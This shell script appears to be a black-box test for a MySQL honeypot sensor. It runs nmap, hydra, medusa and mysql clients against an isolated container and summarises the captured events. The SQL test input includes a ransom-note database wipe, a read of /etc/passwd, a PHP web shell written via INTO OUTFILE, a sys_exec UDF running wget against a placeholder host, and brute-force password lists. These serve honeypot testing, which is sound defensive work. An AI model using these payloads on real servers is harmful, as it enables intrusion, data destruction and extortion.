#!/bin/sh
# Black-box check with real clients (mysql 8.0 CLI, PyMySQL, hydra, medusa, nmap) against the
# built container. Usage (repo root):  sg docker -c "sh sensors/mysql/tests/blackbox.sh"
# Needs docker and network access to pull redis, mysql:8.0, alpine, python and instrumentisto/nmap.
# A throwaway Redis (no auth) on a private network collects the events, which are summarised at
# the end. Nothing is published on the host.
set -eu
cd "$(dirname "$0")/../../.."
NET=sp-mysql-bb; NAME=sp-mysql-bb; IMG=sp-mysql-bb:dev; REDIS=sp-mysql-bb-redis
cleanup() {
  docker rm -f "$NAME" "$REDIS" >/dev/null 2>&1 || true
  docker network rm "$NET" >/dev/null 2>&1 || true
  docker volume rm "$NAME-data" >/dev/null 2>&1 || true
}
trap cleanup EXIT; cleanup
docker build -q -f sensors/mysql/Dockerfile -t "$IMG" . >/dev/null
docker network create "$NET" >/dev/null
docker run -d --name "$REDIS" --network "$NET" valkey/valkey:9.1-alpine3.24 >/dev/null
docker run -d --name "$NAME" --network "$NET" --read-only --tmpfs /tmp --cap-drop ALL \
  --security-opt no-new-privileges:true --memory 256m --memory-swap 256m --cpus 0.5 --pids-limit 128 \
  -v "$NAME-data:/data" -e REDIS_HOST="$REDIS" -e EVENTS_STREAM=events:mysql "$IMG" >/dev/null
for _ in $(seq 1 30); do
  [ "$(docker inspect -f '{{.State.Health.Status}}' "$NAME")" = healthy ] && break
  sleep 2
done
[ "$(docker inspect -f '{{.State.Health.Status}}' "$NAME")" = healthy ] || { echo "not healthy"; exit 1; }
echo HEALTHY
MYSQL="docker run --rm --network $NET mysql:8.0 mysql -h $NAME"

echo "--- nmap -sV + scripts"
docker run --rm --network "$NET" instrumentisto/nmap -Pn -sV -p 3306 \
  --script mysql-info,mysql-empty-password,ssl-cert "$NAME" | sed -n '/^PORT/,/^Service detection/p'

echo "--- mysql 8.0 client, TLS preferred (default), root with empty password"
$MYSQL -uroot --ssl-mode=PREFERRED -e "select @@version, version(), @@version_comment, database(), user(); \\s" 2>&1 | head -30

echo "--- mysql client, no TLS, caching_sha2 full auth over RSA (cleartext reaches the sensor)"
$MYSQL -uwebapp -p'Winter2026!' --ssl-mode=DISABLED --get-server-public-key -e "select 1" 2>&1 | head -3

echo "--- ransomware-like script"
$MYSQL -uroot -e "SHOW DATABASES; DROP DATABASE shop; CREATE DATABASE PLEASE_READ_ME; USE PLEASE_READ_ME; \
CREATE TABLE WARNING (id INT, bitcoin_address TEXT, note TEXT); \
INSERT INTO WARNING VALUES (1,'bc1qexampleexampleexample','To recover your data send 0.05 BTC to the address above'); \
SHOW DATABASES; SELECT * FROM WARNING;" 2>&1 | head -20

echo "--- recon + dump on the fake shop database (script on stdin, --force keeps going after errors)"
cat <<'SQL' | docker run --rm -i --network "$NET" mysql:8.0 mysql -h "$NAME" -uroot --force 2>&1 | head -30
use shop;
show tables;
select id, first_name, email from customers limit 3;
select count(*) from orders;
select load_file('/etc/passwd');
select '<?php system($_GET[0]);?>' into outfile '/var/www/html/x.php';
create function sys_exec returns int soname 'lib_mysqludf_sys.so';
select sys_exec('wget http://198.51.100.9/x.sh -O /tmp/x.sh');
SQL

echo "--- PyMySQL"
docker run --rm --network "$NET" python:3.15-slim-trixie sh -c "pip install -q pymysql cryptography >/dev/null 2>&1; python - <<PY
import pymysql
c = pymysql.connect(host='$NAME', user='root', password='', ssl_disabled=True)
cur = c.cursor(); cur.execute('select @@version'); print(cur.fetchone())
try:
    pymysql.connect(host='$NAME', user='root', password='wrong', ssl_disabled=True)
except Exception as e:
    print(e)
PY"

echo "--- hydra / medusa short brute-force bursts"
docker run --rm --network "$NET" debian:bookworm-slim sh -c "apt-get update -qq >/dev/null 2>&1; \
apt-get install -y -qq hydra medusa >/dev/null 2>&1; \
printf 'password\n123456\nadmin\nroot\nmysql\nqwerty\nletmein\ntoor\nchangeme\ndragon\n' > /tmp/pw; \
hydra -l admin -P /tmp/pw -t 4 -f mysql://$NAME 2>&1 | tail -4; \
medusa -h $NAME -u root -P /tmp/pw -M mysql -t 2 -f 2>&1 | tail -3"

sleep 1
echo "--- event summary"
docker exec "$REDIS" valkey-cli XRANGE events:mysql - + | grep '^{' > /tmp/sp-mysql-events.txt || true
sed -E 's/.*"type":"([a-z_]+)".*/\1/' /tmp/sp-mysql-events.txt | sort | uniq -c
echo "flags seen:"; grep -o '"flags":\[[^]]*\]' /tmp/sp-mysql-events.txt | sort | uniq -c | sort -rn | head -12
echo "login attempts (user / password / source / success):"
grep '"type":"login_attempt"' /tmp/sp-mysql-events.txt | \
  sed -E 's/.*"username":"([^"]*)".*"password":("[^"]*"|null).*"success":(true|false).*"password_source":("[^"]*"|null).*/\1 \2 \4 \3/' | sort | uniq -c | sort -rn | head -20
grep -c '"download_attempt"' /tmp/sp-mysql-events.txt | sed 's/^/download_attempt events=/'
docker logs "$NAME" 2>&1 | grep -ci "honeypot\|suckerpot\|traceback" | sed 's/^/giveaway_or_traceback_lines_in_logs=/' || true
docker stats --no-stream --format 'memory={{.MemUsage}} cpu={{.CPUPerc}}' "$NAME"
rm -f /tmp/sp-mysql-events.txt
